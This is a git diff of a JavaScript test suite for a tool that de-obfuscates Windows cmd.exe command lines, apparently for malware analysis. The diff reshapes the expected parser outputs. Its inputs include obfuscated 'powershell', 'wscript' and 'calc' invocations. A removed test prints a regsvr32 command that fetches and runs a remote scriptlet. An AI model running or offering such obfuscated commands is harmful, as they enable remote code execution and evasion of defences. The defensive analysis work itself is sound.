@@ -97,17 +97,30 @@ describe("Interpreter", () => {
 
             it("should return the input without escapes", () => {
                 const input  = `^p^o^w^e^r^s^h^e^l^l`,
-                      output = [{
-                          command: { name: "powershell", line: "" },
-                          options: {},
-                          variables: {}
-                      }];
+                      output = [
+                          {
+                              vars: { nextframe: {}, thisframe: {} },
+                              commands: [
+                                  {
+                                      command: { name: "powershell", line: "" },
+                                      options: {}
+                                  }
+                              ]
+                          }
+                      ];
                 assert.deepEqual(interpret(input), output);
             });
 
             it("should disable escapes when 'strip_escapes' is false", () => {
                 const input  = `^p^o^w^e^r^s^h^e^l^l`,
-                      output = [{ command: { name: input, line: "" }, options: {}, variables: {}}];
+                      output = [{
+                          vars: { nextframe: {}, thisframe: {} },
+                          commands: [{
+                              command: { name: input, line: "" },
+                              options: {}
+                          }]
+                      }];
+
                 assert.deepEqual(interpret(input, { strip_escapes: false }), output);
             });
         });
@@ -122,7 +135,14 @@ describe("Interpreter", () => {
 
             it("should strip empty strings", () => {
                 const input  = `w""scr""ipt""`,
-                      output = [{ command: { name: "wscript", line: ""}, options: {}, variables: {}}];
+                      output = [{
+                          vars: { thisframe: {}, nextframe: {} },
+                          commands: [{
+                              command: { name: "wscript", line: "" },
+                              options: {}
+                          }]
+                      }];
+
                 assert.deepEqual(interpret(input), output);
             });
 
@@ -230,12 +250,13 @@ describe("Interpreter", () => {
         it("should strip trailing closing parens from a single command", () => {
 
             const input = `(((calc)))`,
-                  output = [
-                      {
+                  output = [{
+                      vars: { thisframe: {}, nextframe: {} },
+                      commands: [{
                           command: { name: "calc", line: "" },
-                          options: {}, variables: {}
-                      }
-                  ];
+                          options: {}
+                      }]
+                  }];
 
             assert.deepEqual(interpret(input), output);
 
@@ -286,15 +307,19 @@ describe("Interpreter", () => {
                 const input   = `cmd /c "ca""lc"`,
                       output  = [
                           {
-                              command: { name: `cmd`, line: `/c "calc"` },
-                              variables: {},
-                              options: { run_then_terminate: true }
-                          },
-                          {
-                              command: { name: "calc", line: "" },
-                              variables: {},
-                              options: {}
+                              vars: { thisframe: {}, nextframe: {} },
+                              commands: [
+                                  {
+                                      command: { name: "cmd", line: `"calc"` },
+                                      options: { run_then_terminate: true }
+                                  },
+                                  {
+                                      command: { name: "calc", line: "" },
+                                      options: {}
+                                  }
+                              ]
                           }
+
                       ];
 
                 let context = interpret(input);
@@ -306,22 +331,25 @@ describe("Interpreter", () => {
                 const input  = `cmd /c "set x=y"`,
                       output = [
                           {
-                              command: { name: `cmd`, line: `/c "set x=y"` },
-                              variables: { },
-                              options: { run_then_terminate: true }
+                              vars: { thisframe: {}, nextframe: { x: "y" } },
+                              commands: [
+                                  {
+                                      command: { name: "cmd", line: `"set x=y"` },
+                                      options: { run_then_terminate: true }
+                                  },
+                                  {
+                                      command: { name: "set", line: "x=y" },
+                                      options: {}
+                                  }
+                              ]
                           },
-                          {
-                              command: { name: `set`, line: "x=y" },
-                              variables: { x: "y" },
-                              options: {}
-                          }
                       ];
 
                 let context = interpret(input);
                 assert.deepEqual(context, output);
             });
 
-            it("should not expand variables in the same context as a SET", () => {
+            it.only("should not expand variables in the same context as a SET", () => {
 
                 const input  = `SET x=y&& echo %x%`,
                       output = [
@@ -340,13 +368,45 @@ describe("Interpreter", () => {
                 assert.deepEqual(interpret(input), output);
             });
 
-            it.only("should expand variables when 'CALL' is used", () => {
+            it("should expand variables when 'CALL' is used", () => {
                 // TODO
                 // ====
                 // Get 'CALL' expanding environment variables.
                 //
                 const input  = `cmd /c "set foo=bar&&call echo %foo%"`,
                       output = [
+                          {
+                              vars: {
+                                  nextframe: {},
+                                  thisframe: { foo: "bar" }
+                              },
+                              commands: [
+                                  {
+                                      command: { name: "call", line: "echo %foo%" },
+                                      options: {}
+                                  },
+                                  {
+                                      command: { name: "echo", line: "bar" },
+                                      options: {}
+                                  },
+                              ]
+                          },
+                          {
+                              vars: {
+                                  nextframe: { foo: "bar" },
+                                  thisframe: {}
+                              },
+                              commands: [
+                                  {
+                                      command: { name: "cmd", line: `"set foo=bar&&call echo %foo%"` },
+                                      options: { run_then_terminate: true }
+                                  },
+                                  {
+                                      command: { name: "set", line: `foo=bar` },
+                                      options: {}
+                                  }
+                              ]
+                          }
                       ];
 
                 assert.deepEqual(interpret(input), output);
@@ -383,24 +443,6 @@ describe("Interpreter", () => {
                 tests.forEach(t => {
                     assert.deepEqual(interpret(t.input), t.output);
                 });
-            });
-        });
-
-        describe("From FireEye DOSFuscation Report", () => {
-
-            it("should clean-up regsvr32 output", () => {
-                const input  = `regsvr32.exe /s /n /u /i:"h"t"t"p://github.com/a.jpg scrobj.dll`,
-                      output = [
-                          {
-                              command: {
-                                  name: "regsvr32",
-                                  line: `/s /n /u /i:"http://github.com/a.jpg" scrobj.dll`
-                              },
-                              options: {},
-                              variables: {}
-                          }
-                      ];
-                assert.deepEqual(interpret(input), output);
             });
         });
     });
